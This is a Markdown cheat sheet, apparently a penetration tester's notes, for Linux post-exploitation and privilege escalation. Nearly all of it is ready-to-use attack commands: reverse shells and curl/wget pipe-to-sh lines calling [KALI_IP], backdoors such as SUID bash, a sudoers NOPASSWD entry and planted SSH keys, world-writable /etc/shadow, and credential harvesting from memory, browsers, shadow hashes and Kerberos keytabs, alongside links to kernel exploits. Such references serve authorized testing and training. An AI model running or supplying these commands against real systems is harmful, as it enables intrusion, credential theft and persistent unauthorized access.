# Linux
*   Generic Tools
    *   Linux Smart Enumeration
    *   LinPEAS
    *   LinEnum
*   Shells & Payloads
    *   Metasploit
        *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
        *   `set payload linux/[x86/x64]/shell/[BIND/REVERSE]_tcp` → Also test `meterpreter` 
        *   `set payload linux/[x86/x64]/shell_[BIND/REVERSE]_tcp`
    *   Web Shells
        *   `ls -la /usr/share/webshells` + [Public Repository](https://github.com/nicholasaleks/webshells)
        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / WAR (Tomcat)
    *   Bash / Netcat / Python
        *   `sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1`
        *   `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc [KALI_IP] [PORT] >/tmp/f` 
        *   `busybox nc [KALI_IP] [PORT] -e sh`
        *   [Python Shortest](https://www.revshells.com/)
    *   CURL / WGET
        *   `wget -q -O - http://[KALI_IP]/[SCRIPT] | sh`
        *   `curl -s http://[KALI_IP]/[SCRIPT] | sh`
    *   SSH Hijacking
        *   `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `/home/[VICTIM_USER]/.ssh/authorized_keys`
        *   `chmod 600 [KEY_FILE]`
        *   `ssh -i [KEY_FILE] [USER]@[IP]`
    *   MSFVenom
        *   Executable Upload
            *   `metash()`
            *   ELF                 → `chmod +x [FILE]`
            *   ELF-SO          → SO Hijacking
            *   PHP                → `-p php/meterpreter/reverse_tcp -f raw`
            *   WAR / JSP     → `-p java/shell_reverse_tcp -f war`
        *   BOF Shellcode
            *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
            *   Encoders         → `x86/shikata_ga_nai` / `x86/unicode_m`
            *   Extra Options    → `BufferRegister=EAX` / `Exitfunc=thread`
    *   Bash Payloads
        *   `chmod u+s /bin/bash`       → `/bin/bash -p` → Give SUID to Shell [GTFOBin](https://gtfobins.github.io/)(`find` / Other)
        *   `chmod 777 /etc/shadow`   → Hash Cracking
        *   `chmod 777 /etc/passwd`   → Remove `x` from root
        *   `echo "[USER] ALL=(ALL) NOPASSWD: ALL" | tee /etc/sudoers.d/[USER]` → Give User `sudo su` privileges
        *   Create User
            *   `usermod [USER] --password $(echo [PASS] | openssl passwd -1 -stdin)`
        *   Set Group Membership
            *   `usermod -aG [GROUP] [USER]` → `sudo` Group / Alternative
*   File Transfers
    *   Writable Directories
        *   `/var/tmp`
        *   `/tmp`
        *   `/dev/shm`
    *   HTTP
        *   [GTFOBins](https://gtfobins.github.io/#+file%20download)
        *   `httpserv()`
        *   `curl http://[IP]:8888/[SRC] -o [DEST]`
        *   `wget http://[IP]:8888/[SRC] -O [DEST]`
        *   Native Bash
            *   `exec 3<>/dev/tcp/[IP]/8888`
            *   `echo -e "GET /[SRC] HTTP/1.1\n\n">&3`
            *   `cat <&3 | tee [DEST]`
        *   Server on Victim
            *   `python3 -m http.server 8000`
            *   `python2 -m SimpleHTTPServer 8000`
            *   `php -S 0.0.0.0:8000`
            *   `ruby -run -ehttpd . -p8000`
    *   NC
        *   `nc -lvp 5555 > [DEST]`
        *   `nc [IP] [PORT] < [SRC]`
    *   B64
        *   `cat [SRC] |base64 -w 0;echo`
        *   `echo -n '[B64_DATA]' | base64 -d > [DEST]`
    *   SSH
        *   `sudo systemctl [enable/start] ssh`
        *   `scp [SRC] [USER]@[IP]:[DEST]`
*   Users
    *   Enumeration
        *   `cat /etc/passwd | grep "*sh$"`    → Writable  + Valid Usernames
        *   `id`                                                           → [Privileged Groups Exploitation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe) / Custom Group Access
        *   `ls -lar /home/`                                   → Sensitive & Dot Files / SSH Keys (`id_rsa` / `id_ecdsa`) / History & RC Files / Mozilla Profiles
        *   `ls -la /var/spool /var/mail`        → E-Mail Data
        *   `ls -la /var/backups /backup`        → Backup Files
        *   `(env || set) 2>/dev/null`              → Environmental Variables
        *   `ls -la /opt /srv /app`                    → Applications / Exploit Research / Code Analysis
        *   `ls -la /`                                               → Readable Root Files / Directories
        *   `dpkg -l` / `rpm -qa`                              → OpenVAS & Debsecan / Interesting Names (Nagios / Other)
    *   Shells
        *   TTY Upgrade
            *   `python -c 'import pty; pty.spawn("/bin/bash")'` / `script /dev/null -c bash`
            *   CTRL+Z → `stty raw -echo; fg` → `screen`
        *   Local Authentication
            *   `su - [username]`
            *   Password Re-Use
        *   Jail Breakouts
            *   `echo $PATH` / `help`     → GTFOBin 
            *   `ls -la /.dockerenv` → [Docker Breakouts](https://juggernaut-sec.com/docker-breakout-lpe/) + `capsh --print` + Disk Access → `df -h`
            *   RBash                          → SSH `-t bash` / [Auto-Completion Bypass](https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html)
        *   Tmux Hijacking
            *   `tmux --version` < v2.1
            *   `tmux ls` → `tmux attach -d -t [NAME]`
        *   Outdated Screen / Bash 
            *   `bash --version`
            *   `screen --version`
    *   SUDO
        *   Misconfigurations
            *   `sudo -V`                                                        → Outdated Version
            *   `ls -la /etc/sudoers /etc/sudoers.d` → [Writable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
            *   `ls -la /var/run/sudo/ts/$(whoami)`   → [Writable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d) → `write_sudo_token [SHELL_PID] [SUDO/TS/FILE]`
        *   Exploitation
            *   `sudo -l` 
            *   GTFOBin Escape / Exploit Research → Interesting & Uncommon Names
            *   SO Injection                     → `LD_PRELOAD` / `LD_LIBRARY_PATH`
            *   PATH Hijacking               → Missing `secure_path` / `SETENV` / `PYTHONPATH`
            *   SUDO PATH Hijacking  → Relative/Current Paths + `strings`
            *   RPATH Hijacking            → `readelf -d [BINARY] | grep -E "NEEDED|RPATH"`
            *   LDD PATH Hijacking     → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
            *   Bash Scripts                     → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
            *   Python Scripts                → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
            *   Custom Binaries            → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / MD5SUM VirusTotal Check / Filetype & Metadata
    *   Cronjobs
        *   Enumeration
            *   `ls -la /etc/cron* /var/spool/`
            *   `cat /etc/crontab /etc/anacrontab`
            *   Profile Scripts
                *   `ls -la /etc/profile / etc/profile.d/`
                *   Writable Scripts → Wait / Force Login
        *   Exploitation
            *   CRON PATH Hijacking → Relative/Current Paths + `strings`
            *   SO Injection                    → `strace [BINARY] 2>&1 | grep -i -E "open|access|no such file"`
            *   RPATH Hijacking           → `readelf -d [BINARY] | grep -E "NEEDED|RPATH"`
            *   LDD PATH Hijacking    → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
            *   Bash Scripts                    → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
            *   Python Scripts               → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
    *   Credential Hunting
        *   Repeat → From Root
        *   Memory & Sessions (Root)
            *   `mimipenguin.sh`
            *   `lazagne.py all`
        *   File Hunting
            *   Filenames    → `find / -type f -iname "[STRING]" 2>/dev/null` → `db` / `database` / `conf` / `settings` / `cred` / `pass`
            *   Contents      → `grep -rniH "[STRING]" [PATH] [-e REGEX]`
        *   Web Applications
            *   Web Roots       → `/var/www/`, `/srv/http/`, `/usr/local`, `/opt`, `/app`
            *   Virtual Hosts    → `default`, `000-default.conf`
            *   Log Files            → `[access/error].log`, `httpd-[access/error].log`, `httpd.conf`
            *   DB Files             → `*[db/database/settings/config].*`, `/var/db/*`, `*.db`, `.sql*`
            *   Code Analysis   → Sensitive Exposure / Docker Files / Inputs & Functions / DB Connection Strings / Dependencies
        *   GIT Repositories
            *   Directories → `.git` / `.gitignore`
            *   `git log --oneline` 
            *   `git status`
            *   `git show [HASH]`
            *   `git diff [HASH_1] [HASH_2]`
        *   Local Hashes
            *   `cat /etc/shadow`                       → John + Unshadow
            *   `cat /etc/security/opasswd`   → `hashcat -m 500`
        *   NFS Exports
            *   Data Access / Root Squashing
            *   `cat /etc/exports`             → `sudo mount -t nfs [VICTIM_IP]:/[SHARED_NFS] /mnt`
            *   `cp [PAYLOAD_FILE] /mnt` → `chmod u+s /mnt/[PAYLOAD_FILE]` → Execute Payload
        *   DB Files
            *   `for ext in $(echo ".*db .db* .sql .sql* .db");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null; done`
        *   Browsers
            *   `lazagne.py browsers`
            *   `ls -la .mozilla/firefox/ | grep default` → `logins.json` File
            *   [Firefox Decrypt](https://github.com/unode/firefox_decrypt)
        *   Documents
            *   `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
        *   Configuration Files
            *   Research All Services   → `find / -type f -iname "*.[CNF/CONF/CONFIG]" -readable 2>/dev/null` + Settings Files
            *   Write Permission          → MySQL UDF 
            *   Readable Data & Credentials
        *   SSH Keys
            *   `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"` → Ciphered Public Keys → `.enc | base64` + RsaCTFTool.py
            *   `grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"`   → Encrypted / Usable Type
            *   SSH2John Cracking
        *   ADM Logs
            *   `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
        *   Scripts
            *   `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
        *   Drives Data
            *   `fdisk -l` → `ls /dev 2>/dev/null | grep -i "sd"`
            *   `mount -t [TYPE] /dev/[MOUNTPOINT] /mnt/`
            *   `/etc/fstab`, `/etc/mtab` → File & Contents Hunting
        *   Archives
            *   `for ext in $(echo ".zip .rar .gz .xz .tar .gzip .7z");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null; done`
            *   Extensions    → `curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\."`
            *   BitLocker       → `find / -iname '*.vhd' 2>/dev/null` → Transfer Windows + Mount
            *   OpenSSL       → `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in [GZIP] -k $i 2>/dev/null| tar xz;done`
        *   Kerberos Tickets
            *   Enumeration
                *   `env | grep -i krb5`
                *   `find / -name *keytab* -ls 2>/dev/null`
                *   `ls -la /tmp | grep krb`
                *   `./linikatz.sh`
            *   Check User                → `klist -k -t [KEYTAB]`
            *   Impersonate User   → `kinit [USER] -k -t [KEYTAB]`
            *   Get/Crack Hash        → `python3 keytabextract.py [KEYTAB]`
            *   Pass Ticket                 → `export KRB5CCNAME=[KRB5CC_FILE]`
            *   Dynamic Pivoting    → `sudo nano /etc/krb5.conf` + Add Realm `[DOMAIN] = { kdc = [INTERNAL_HOST]}`
            *   Lin to Windows         → `ticketConverter.py [KEYTAB] lin.ccache`
*   OS
    *   Kernel Exploits
        *   `uname -a && cat /etc/*-release` → Exploit Research
        *   [Old Kernels](https://github.com/lucyoa/kernel-exploits) (3.x - 4.x)
        *   [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git) (5.8 - 5.17)
        *   CVE-2021-22555 (2.6 - 5.11)
        *   [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233) (6.x < 6.3.1)
        *   [CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386) (Ubuntu 22.04 - 5.15.x)
        *   DMESG Signature EOP → `dmesg 2>/dev/null | grep "signature"` → [Exploitation](https://0xdf.gitlab.io/2019/12/14/htb-smasher2.html)
    *   SUID / CAP Binaries
        *   `find / -perm -4000 2>/dev/null`
        *   `getcap -r / 2>/dev/null`
        *   Exploitation
            *   GTFOBin Escape / Exploit Research → Interesting & Uncommon Names
            *   PATH Hijacking               → Relative/Current Paths + `strings` 
            *   [Function Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-binary-with-command-path)      → Absolute Binary Paths
            *   SO Injection                     → `strace [BINARY] 2>&1 | grep -i -E "open|access|no such file"`
            *   RPATH Hijacking            → `readelf -d [BINARY] | grep -E "NEEDED|RPATH"`
            *   LDD PATH Hijacking     → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
            *   Bash Scripts                     → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
            *   Python Scripts                → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
            *   Custom Binaries            → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / MD5SUM VirusTotal Check / Filetype & Metadata
    *   Processes
        *   `ps -aux | grep [root/username]`
        *   `pspy -pf -i 1000` → Process Spying
        *   Exploits
            *   Fail2Ban / Apache Struts / Logrotate / Web Debuggers
            *   Privileged Scripts   → SUDO / SUID Sections Checks
            *   Command Strings → Sensitive Exposure
            *   Associated Services / Binaries
            *   Memory Dumping
    *   Network 
        *   Local Services 
            *   `netstat -puntal` → Localhost / Intranet IPs
            *   Port Forwarding
            *   DB Access
                *   [UDF Root MySQL EOP](https://juggernaut-sec.com/mysql-user-defined-functions/)
                *   Blank Password
                *   Data Dumping
        *   [Dynamic Forwarding](https://notes.dollarboysushil.com/pivoting-and-tunneling/ligolo-ng)
            *   Intranet IPs
                *   `ifconfig` / `ip -a`
                *   `10.x.x.x` / `192.168.x.x` / `172.[16-31].x.x`
            *   Lateral Hosts
                *   `cat /etc/hosts`
                *   `cat /etc/resolv.conf`
                *   `arp -a`
        *   Traffic Sniffing
            *   `tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]`
            *   `Pcredz.py`
            *   PCAP Wireshark Analysis → All Unencrypted Protocols + [MySQL Hashes](https://0xma.github.io/hacking/toby_crack_mysql_hashes.html)
    *   Service Files
        *   `find / -type f -iname "*.service" [-writable/-readable] -exec ls -l {} \; 2>/dev/null`
        *   Writable ExecStart
        *   Writable Executed Binary
        *   SYSTEMD PATH Hijacking → `systemctl show-environment`
    *   Sockets
        *   `netstat -a -p --unix`
        *   `find / -iname "docker.sock" 2>/dev/null` → Write Permissions
